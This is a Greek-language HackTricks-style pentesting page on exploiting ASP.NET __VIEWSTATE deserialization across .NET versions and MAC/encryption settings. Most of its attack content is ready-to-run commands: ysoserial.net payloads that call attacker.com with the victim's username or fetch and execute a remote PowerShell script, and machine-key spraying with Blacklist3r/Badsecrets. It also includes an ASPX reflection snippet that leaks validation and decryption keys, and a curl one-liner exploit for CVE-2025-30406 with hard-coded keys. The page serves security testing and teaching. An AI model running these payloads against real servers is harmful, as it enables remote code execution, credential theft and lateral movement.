# Εκμετάλλευση \_\_VIEWSTATE χωρίς να γνωρίζετε τα μυστικά

{{#include ../../banners/hacktricks-training.md}}



## Τι είναι το ViewState

**ViewState** λειτουργεί ως ο προεπιλεγμένος μηχανισμός στο ASP.NET για τη διατήρηση των δεδομένων της σελίδας και των control ανάμεσα σε σελίδες. Κατά την απόδοση του HTML μιας σελίδας, η τρέχουσα κατάσταση της σελίδας και οι τιμές που πρέπει να διατηρηθούν κατά το postback σειριοποιούνται σε strings κωδικοποιημένα σε base64. Αυτά τα strings στη συνέχεια τοποθετούνται σε κρυφά πεδία ViewState.

Οι πληροφορίες ViewState μπορούν να χαρακτηρίζονται από τις ακόλουθες ιδιότητες ή τους συνδυασμούς τους:

- **Base64**:
- Αυτή η μορφή χρησιμοποιείται όταν και τα δύο attributes `EnableViewStateMac` και `ViewStateEncryptionMode` έχουν ρυθμιστεί σε false.
- **Base64 + MAC (Message Authentication Code) Enabled**:
- Η ενεργοποίηση του MAC επιτυγχάνεται με τη ρύθμιση του attribute `EnableViewStateMac` σε true. Αυτό παρέχει επαλήθευση ακεραιότητας για τα δεδομένα ViewState.
- **Base64 + Encrypted**:
- Εφαρμόζεται κρυπτογράφηση όταν το attribute `ViewStateEncryptionMode` έχει τιμή true, εξασφαλίζοντας την εμπιστευτικότητα των δεδομένων ViewState.

## Περιπτώσεις Δοκιμής

Η εικόνα είναι ένας πίνακας που περιγράφει διάφορες ρυθμίσεις για το ViewState στο ASP.NET με βάση την έκδοση του .NET framework. Εδώ είναι μια σύνοψη του περιεχομένου:

1. Για **οποιαδήποτε έκδοση του .NET**, όταν τόσο το MAC όσο και η Κρυπτογράφηση είναι απενεργοποιημένα, δεν απαιτείται MachineKey, και επομένως δεν υπάρχει εφαρμόσιμη μέθοδος για την αναγνώρισή του.
2. Για **εκδόσεις κάτω από 4.5**, εάν το MAC είναι ενεργοποιημένο αλλά η Κρυπτογράφηση όχι, απαιτείται MachineKey. Η μέθοδος για τον εντοπισμό του MachineKey αναφέρεται ως "Blacklist3r."
3. Για **εκδόσεις κάτω από 4.5**, ανεξαρτήτως του αν το MAC είναι ενεργοποιημένο ή απενεργοποιημένο, εάν η Κρυπτογράφηση είναι ενεργοποιημένη, απαιτείται MachineKey. Ο εντοπισμός του MachineKey είναι έργο για "Blacklist3r - Future Development."
4. Για **εκδόσεις 4.5 και άνω**, όλες οι συνδυαστικές περιπτώσεις MAC και Κρυπτογράφησης (είτε και τα δύο true, είτε το ένα true και το άλλο false) απαιτούν MachineKey. Το MachineKey μπορεί να εντοπιστεί χρησιμοποιώντας "Blacklist3r."

### Περίπτωση Δοκιμής: 1 – EnableViewStateMac=false και viewStateEncryptionMode=false

Επίσης είναι δυνατό να απενεργοποιηθεί εντελώς το ViewStateMAC ρυθμίζοντας το registry key `AspNetEnforceViewStateMac` σε μηδέν στο:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**Εντοπισμός χαρακτηριστικών ViewState**

Μπορείτε να προσπαθήσετε να διαπιστώσετε εάν το ViewState προστατεύεται με MAC καταγράφοντας ένα αίτημα που περιέχει αυτήν την παράμετρο με το BurpSuite. Εάν το MAC δεν χρησιμοποιείται για την προστασία της παραμέτρου, μπορείτε να την εκμεταλλευτείτε χρησιμοποιώντας [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### Περίπτωση δοκιμής 1.5 – Όπως η Περίπτωση δοκιμής 1 αλλά το ViewState cookie δεν αποστέλλεται από τον server

Οι προγραμματιστές μπορούν να **αφαιρέσουν το ViewState** από το να γίνει μέρος ενός HTTP Request (ο χρήστης δεν θα λάβει αυτό το cookie).\
Κάποιος μπορεί να υποθέσει ότι αν το **ViewState** **δεν υπάρχει**, η υλοποίησή τους είναι **ασφαλής** από οποιεσδήποτε πιθανές ευπάθειες που προκύπτουν με το ViewState deserialization.\
Ωστόσο, αυτό δεν ισχύει. Εάν **προσθέσουμε το ViewState parameter** στο σώμα του αιτήματος και στείλουμε το serialized payload που δημιουργήσαμε χρησιμοποιώντας ysoserial, θα καταφέρουμε ακόμη να επιτύχουμε **code execution** όπως φαίνεται στην **Case 1**.

### Περίπτωση δοκιμής 2 – .Net < 4.5 και EnableViewStateMac=true & ViewStateEncryptionMode=false

Για να **επιτρέψουμε το ViewState MAC** για μια **συγκεκριμένη σελίδα** πρέπει να κάνουμε τις ακόλουθες αλλαγές σε ένα συγκεκριμένο αρχείο aspx:
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
Μπορούμε επίσης να το κάνουμε για την **ολόκληρη** εφαρμογή ορίζοντάς το στο αρχείο **web.config** όπως φαίνεται παρακάτω:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
Καθώς η παράμετρος προστατεύεται με MAC αυτή τη φορά, για να εκτελεστεί επιτυχώς η επίθεση πρέπει πρώτα να βρούμε το κλειδί που χρησιμοποιείται.

Μπορείτε να δοκιμάσετε να χρησιμοποιήσετε [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) για να βρείτε το κλειδί που χρησιμοποιείται.
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) είναι ένα άλλο εργαλείο που μπορεί να εντοπίσει γνωστά machineKeys. Είναι γραμμένο σε Python, οπότε σε αντίθεση με το Blacklist3r, δεν υπάρχει εξάρτηση από τα Windows. Για .NET viewstates, υπάρχει ένα βοηθητικό πρόγραμμα "python blacklist3r", που είναι ο ταχύτερος τρόπος να το χρησιμοποιήσετε.

Μπορεί είτε να δεχθεί απευθείας το viewstate και τον generator:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

Ή μπορεί να συνδεθεί απευθείας στη στοχευμένη διεύθυνση URL και να προσπαθήσει να εξαγάγει το viewstate από το HTML:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

Για να εντοπίσετε ευάλωτα viewstates σε μεγάλη κλίμακα, σε συνδυασμό με subdomain enumeration, μπορείτε να χρησιμοποιήσετε το module `badsecrets` [**BBOT**](exploiting-__viewstate-parameter.md):
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

Εάν είστε τυχεροί και βρεθεί το κλειδί, μπορείτε να προχωρήσετε με την επίθεση χρησιμοποιώντας [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:**
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
Σε περιπτώσεις όπου η παράμετρος `_VIEWSTATEGENERATOR` **δεν αποστέλλεται** από τον server **δεν** χρειάζεται να **παρέχετε** την παράμετρο `--generator` **αλλά αυτές**:
```bash
--apppath="/" --path="/hello.aspx"
```
### Exploiting recycled `<machineKey>` values at scale

Ink Dragon (2025) επέδειξε πόσο επικίνδυνο είναι όταν διαχειριστές **αντιγράφουν τα δείγματα `<machineKey>` blocks που δημοσιεύονται σε Microsoft docs, StackOverflow answers ή vendor blogs**. Μόλις ένας μόνο στόχος leaks ή επαναχρησιμοποιήσει αυτά τα κλειδιά στο farm, κάθε άλλη σελίδα ASP.NET που εμπιστεύεται το ViewState μπορεί να αποκτηθεί εξ αποστάσεως χωρίς κανένα επιπλέον vulnerability.

1. **Δημιουργήστε ένα candidate wordlist** με τα leaked `validationKey`/`decryptionKey` ζεύγη (π.χ. scrape public repos, Microsoft blog posts, ή keys που ανακτήθηκαν από έναν host στο farm) και τροφοδοτήστε το σε Blacklist3r/Badsecrets:

```bash
AspDotNetWrapper.exe --keypath reused_machinekeys.txt --url https://target/_layouts/15/ToolPane.aspx --decrypt --purpose=viewstate --modifier=<VIEWSTATEGENERATOR>
# or let Badsecrets spray the list
bbot -f subdomain-enum -m badsecrets --badsecrets-keylist reused_machinekeys.txt -t sharepoint.customer.tld
```

Το tooling υπογράφει επανειλημμένα ένα benign `__VIEWSTATE` blob με κάθε candidate key μέχρι ο server να αποδεχτεί το MAC, αποδεικνύοντας ότι το κλειδί είναι έγκυρο.
2. **Forge το malicious ViewState** μόλις το ζεύγος κλειδιών γίνει γνωστό. Αν η encryption είναι disabled χρειάζεστε μόνο το `validationKey`. Αν η encryption είναι enabled, συμπεριλάβετε το αντίστοιχο `decryptionKey` ώστε το payload να επιβιώσει στο decrypt → deserialize path:

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -c iwr http://x.x.x.x/a.ps1|iex" \
--validationkey "$VALIDATION" --decryptionkey "$DECRYPTION" --validationalg="SHA1" --generator=<VIEWSTATEGENERATOR>
```

Οι operators συχνά ενσωματώνουν disk-resident launchers (π.χ. PrintNotifyPotato, ShadowPad loaders, κ.λπ.) απευθείας στο payload επειδή εκτελείται ως ο IIS worker (`w3wp.exe`).
3. **Pivot lateralmente** ανακυκλώνοντας το ίδιο `<machineKey>` σε sibling SharePoint/IIS nodes. Μόλις ένας server compromized, μπορείτε να επαναπαίξετε το κλειδί για να χτυπήσετε κάθε άλλο server που δεν έκανε rotation στην configuration του.

### Test Case: 3 – .Net < 4.5 and EnableViewStateMac=true/false and ViewStateEncryptionMode=true

Σε αυτό δεν είναι γνωστό αν το parameter προστατεύεται με MAC. Τότε, η τιμή πιθανότατα είναι encrypted και θα **χρειαστείτε το Machine Key για να encryptάρετε το payload σας** ώστε να εκμεταλλευτείτε την ευπάθεια.

**In this case the** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **module is under development...**

**Prior to .NET 4.5**, το ASP.NET μπορεί να **accept** ένα **unencrypted** \_`__VIEWSTATE`\_parameter από τους χρήστες **ακόμα και αν** το **`ViewStateEncryptionMode`** έχει τεθεί σε _**Always**_. Το ASP.NET **ελέγχει μόνο** την **ύπαρξη** του **`__VIEWSTATEENCRYPTED`** parameter στο request. **Αν αφαιρέσει κανείς αυτό το parameter, και στείλει το unencrypted payload, θα επεξεργαστείται παρ' όλα αυτά.**

Επομένως, αν οι attackers βρουν τρόπο να πάρουν το Machinekey μέσω άλλου vuln όπως file traversal, [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) command που χρησιμοποιείται στο **Case 2**, μπορεί να χρησιμοποιηθεί για RCE χρησιμοποιώντας την ευπάθεια deserialization του ViewState.

- Αφαιρέστε το `__VIEWSTATEENCRYPTED` parameter από το request για να εκμεταλλευτείτε την ευπάθεια ViewState deserialization, αλλιώς θα επιστρέψει σφάλμα Viewstate MAC validation και το exploit θα αποτύχει.

### Test Case: 4 – .Net >= 4.5 and EnableViewStateMac=true/false and ViewStateEncryptionMode=true/false except both attribute to false

Μπορούμε να αναγκάσουμε τη χρήση του ASP.NET framework καθορίζοντας το παρακάτω parameter μέσα στο web.config όπως φαίνεται παρακάτω.
```xml
<httpRuntime targetFramework="4.5" />
```
Εναλλακτικά, αυτό μπορεί να γίνει καθορίζοντας την παρακάτω επιλογή μέσα στην παράμετρο `machineKey` του αρχείου web.config.
```bash
compatibilityMode="Framework45"
```
Όπως και προηγουμένως, η **τιμή είναι κρυπτογραφημένη.** Έτσι, για να στείλει ένα **έγκυρο payload, ο επιτιθέμενος χρειάζεται το κλειδί**.

Μπορείτε να δοκιμάσετε να χρησιμοποιήσετε [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) για να βρείτε το κλειδί που χρησιμοποιείται:
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
Για μια πιο λεπτομερή περιγραφή για τα IISDirPath και TargetPagePath [refer here](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

Ή, με [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) (with a generator value):
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

Μόλις εντοπιστεί ένα έγκυρο Machine key, **το επόμενο βήμα είναι να δημιουργηθεί ένα serialized payload χρησιμοποιώντας** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
If you have the value of `__VIEWSTATEGENERATOR` you can try to **use** the `--generator` parameter with that value and **omit** the parameters `--path` and `--apppath`

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/4.2.png)

Μια επιτυχημένη exploitation της ViewState deserialization ευπάθειας θα οδηγήσει σε ένα out-of-band request προς έναν attacker-controlled server, το οποίο περιλαμβάνει το όνομα χρήστη. Αυτός ο τύπος exploit επιδεικνύεται σε ένα proof of concept (PoC) που μπορείτε να βρείτε μέσω ενός πόρου με τίτλο "Exploiting ViewState Deserialization using Blacklist3r and YsoSerial.NET". Για περισσότερες λεπτομέρειες σχετικά με το πώς λειτουργεί η διαδικασία exploitation και πώς να χρησιμοποιήσετε εργαλεία όπως το Blacklist3r για τον εντοπισμό του MachineKey, μπορείτε να δείτε το παρεχόμενο [PoC of Successful Exploitation](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC).

### Test Case 6 – ViewStateUserKeys χρησιμοποιείται

Η ιδιότητα **ViewStateUserKey** μπορεί να χρησιμοποιηθεί για να **αποτρέψει** ένα **CSRF attack**. Εάν ένα τέτοιο key έχει οριστεί στην εφαρμογή και προσπαθήσουμε να δημιουργήσουμε το **ViewState** payload με τις μεθόδους που έχουμε συζητήσει μέχρι τώρα, το **payload δεν θα επεξεργαστεί από την εφαρμογή**.\
Πρέπει να χρησιμοποιήσετε μία ακόμη παράμετρο για να δημιουργήσετε σωστά το payload:
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### Αποτέλεσμα Επιτυχούς Εκμετάλλευσης <a href="#poc" id="poc"></a>

Για όλες τις περιπτώσεις δοκιμής, αν το payload ViewState YSoSerial.Net λειτουργήσει **επιτυχώς**, τότε ο server απαντά με “**500 Internal server error**” με περιεχόμενο απόκρισης “**The state information is invalid for this page and might be corrupted**” και λαμβάνουμε το OOB reques.

Δείτε [περισσότερες πληροφορίες εδώ](<https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/[**https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)/README.md>)

### Εξαγωγή ASP.NET Machine Keys μέσω Reflection (SharPyShell/SharePoint ToolShell)

Οι επιτιθέμενοι που μπορούν να **upload or execute arbitrary ASPX code** μέσα στο web root του στόχου μπορούν να ανακτήσουν απευθείας τα secret keys που προστατεύουν το `__VIEWSTATE` αντί να τα bruteforce-άρουν.
Ένα ελάχιστο payload που leaks τα keys αξιοποιεί εσωτερικές .NET classes μέσω reflection:
```csharp
<%@ Import Namespace="System.Web.Configuration" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
public void Page_Load(object sender, EventArgs e)
{
var asm = Assembly.Load("System.Web");
var sect = asm.GetType("System.Web.Configuration.MachineKeySection");
var m = sect.GetMethod("GetApplicationConfig", BindingFlags.Static | BindingFlags.NonPublic);
var cfg = (MachineKeySection)m.Invoke(null, null);
// Output: ValidationKey|DecryptionKey|Algorithm|CompatibilityMode
Response.Write($"{cfg.ValidationKey}|{cfg.DecryptionKey}|{cfg.Decryption}|{cfg.CompatibilityMode}");
}
</script>
```
Το αίτημα της σελίδας εμφανίζει τα **ValidationKey**, **DecryptionKey**, τον αλγόριθμο κρυπτογράφησης και τη λειτουργία συμβατότητας ASP.NET. Αυτές οι τιμές μπορούν τώρα να εισαχθούν απευθείας στο **ysoserial.net** για να δημιουργήσουν ένα έγκυρο, υπογεγραμμένο `__VIEWSTATE` gadget:
```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
-c "powershell -nop -c \"whoami\"" \
--generator=<VIEWSTATE_GENERATOR> \
--validationkey=<VALIDATION_KEY> --validationalg=<VALIDATION_ALG> \
--decryptionkey=<DECRYPTION_KEY> --decryptionalg=<DECRYPTION_ALG> \
--islegacy --minify
curl "http://victim/page.aspx?__VIEWSTATE=<PAYLOAD>"
```
Αυτό το **key-exfiltration primitive** εκμεταλλεύτηκε μαζικά σε on-prem SharePoint servers το 2025 ("ToolShell" – CVE-2025-53770/53771), αλλά ισχύει για οποιαδήποτε εφαρμογή ASP.NET όπου ένας επιτιθέμενος μπορεί να εκτελέσει server-side κώδικα.

## Σενάρια πραγματικής εκμετάλλευσης 2024-2025 και Hard-coded Machine Keys

### Microsoft “publicly disclosed machine keys” wave (Dec 2024 – Feb 2025)
Microsoft Threat Intelligence reported mass exploitation of ASP.NET sites where the *machineKey* had previously been leaked on public sources (GitHub gists, blog posts, paste sites). Οι επιτιθέμενοι κατέγραψαν αυτά τα keys και δημιούργησαν έγκυρα `__VIEWSTATE` gadgets με τη νεότερη `ysoserial.net` 1.41 `--minify` και `--islegacy` flags για να παρακάμψουν τα όρια μήκους του WAF:
```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "whoami" \
--validationkey=<LEAKED_VALIDATION_KEY> --validationalg=SHA1 \
--decryptionkey=<LEAKED_DECRYPTION_KEY> --decryptionalg=AES \
--generator=<VIEWSTATEGEN> --minify
```
Οι στόχοι που συνεχίζουν να επαναχρησιμοποιούν τα ίδια στατικά κλειδιά σε farms παραμένουν ευάλωτοι επ' αόριστον· μόλις μεταβούν σε τιμές `AutoGenerate` η spray technique παύει να λειτουργεί, οπότε δώστε προτεραιότητα σε legacy deployments που εξακολουθούν να εκθέτουν hard-coded material.

### CVE-2025-30406 – Gladinet CentreStack / Triofox hard-coded keys
Η Kudelski Security αποκάλυψε ότι πολλές εκδόσεις του CentreStack / Triofox διανεμήθηκαν με ταυτόσημες τιμές `machineKey`, επιτρέποντας unauthenticated remote code execution μέσω ViewState forgery (CVE-2025-30406).

One-liner exploit:
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc.exe" \
--validationkey=ACC97055B2A494507D7D7C92DC1C854E8EA7BF4C \
--validationalg=SHA1 \
--decryptionkey=1FB1DEBB8B3B492390B2ABC63E6D1B53DC9CA2D7 \
--decryptionalg=AES --generator=24D41AAB --minify \
| curl -d "__VIEWSTATE=$(cat -)" http://victim/portal/loginpage.aspx
```
Διορθώθηκε σε CentreStack 16.4.10315.56368 / Triofox 16.4.10317.56372 – αναβαθμίστε ή αντικαταστήστε αμέσως τα keys.

## References

- [Exploiting ViewState deserialization using Blacklist3r and YSoSerial.NET](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
- [Deep dive into .NET ViewState deserialization and its exploitation](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
- [Exploiting deserialisation in ASP.NET via ViewState (Soroush Dalili, 2019)](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
- [Introducing badsecrets – fast machineKey discovery](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)
- [SharePoint “ToolShell” exploitation chain (Eye Security, 2025)](https://research.eye.security/sharepoint-under-siege/)
- [Microsoft Security – Code injection attacks abusing publicly disclosed ASP.NET machine keys (Feb 6 2025)](https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/)
- [Kudelski Security advisory – Gladinet CentreStack / Triofox RCE CVE-2025-30406 (Apr 16 2025)](https://research.kudelskisecurity.com/2025/04/16/gladinet-centrestack-and-gladinet-triofox-critical-rce-cve-2025-30406/)
- [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
- [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
- [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
- [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)
- [SharePoint “ToolShell” exploitation chain (Eye Security, 2025)](https://research.eye.security/sharepoint-under-siege/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)



{{#include ../../banners/hacktricks-training.md}}
